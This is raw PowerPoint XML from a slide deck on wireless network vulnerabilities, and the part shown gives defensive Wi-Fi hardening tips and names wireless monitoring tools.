            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>By default, certain messages broadcast the ID to everyone stop this by using SSID cloaking.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Check the wireless devices for configuration or setup problems regularly.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Securing Wireless network continued..</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;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rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Frequently check for updates on all the wireless equipment and keep them updated.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Place the wireless equipment of the access point in a properly secured place.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Implement WPA2 Enterprise instead of wi-fi protected access (WEP).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Using a centralised server for authentication is best preferred in corporate sectors.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Use a firewall or packet filter in between the AP and the corporate intranet.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="16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Securing Wireless network continued..</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;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Defending wireless networks using tools:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Rogue scanner.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Air Defence.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Airmagnet analyser.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1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5407975" y="3257325"/>
            <a:ext cx="3452100" cy="9327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813</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>68</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Simple Dark</vt:lpstr>
      <vt:lpstr>Wireless Networks and Vulnerabilities</vt:lpstr>
      <vt:lpstr>Abstract</vt:lpstr>
      <vt:lpstr>Project Structure</vt:lpstr>
      <vt:lpstr>Understanding wireless networks</vt:lpstr>
      <vt:lpstr>Understanding wireless networks continued..</vt:lpstr>
      <vt:lpstr>Wireless security</vt:lpstr>
      <vt:lpstr>Vulnerabilities and Exploiting networks</vt:lpstr>
      <vt:lpstr>Vulnerabilities and Exploiting networks continued.. </vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Securing Wireless network</vt:lpstr>
      <vt:lpstr>Securing Wireless network continued.. </vt:lpstr>
      <vt:lpstr>Securing Wireless network continued..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Networks and Vulnerabilities</dc:title>
  <cp:lastModifiedBy>Harsha_Hacker</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-09-03T10:42:07Z</dcterms:modified>
</cp:coreProperties>
</file>